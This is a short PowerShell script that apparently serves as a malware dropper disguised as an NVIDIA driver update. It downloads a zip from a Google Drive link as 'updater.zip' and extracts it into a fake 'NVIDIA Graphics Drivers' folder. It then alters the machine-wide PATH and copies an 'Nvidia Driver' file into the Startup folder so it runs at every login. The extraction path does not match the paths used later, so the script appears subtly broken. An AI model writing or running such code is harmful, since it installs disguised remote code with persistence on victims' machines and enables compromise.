$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=15Np4BGBn1QW0-VcmuRKzmnNIZ-TUOhHu&export=download&authuser=0&confirm=t&uuid=6318f008-dcf3-494b-bd06-bb1b63c29f45&at=APZUnTUO2mSixQhGiPPSBGYEOjRj:1721988761282"
Invoke-WebRequest -Uri $zipFile -OutFile "C:\Users\$username\AppData\Local\Temp\updater.zip"
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
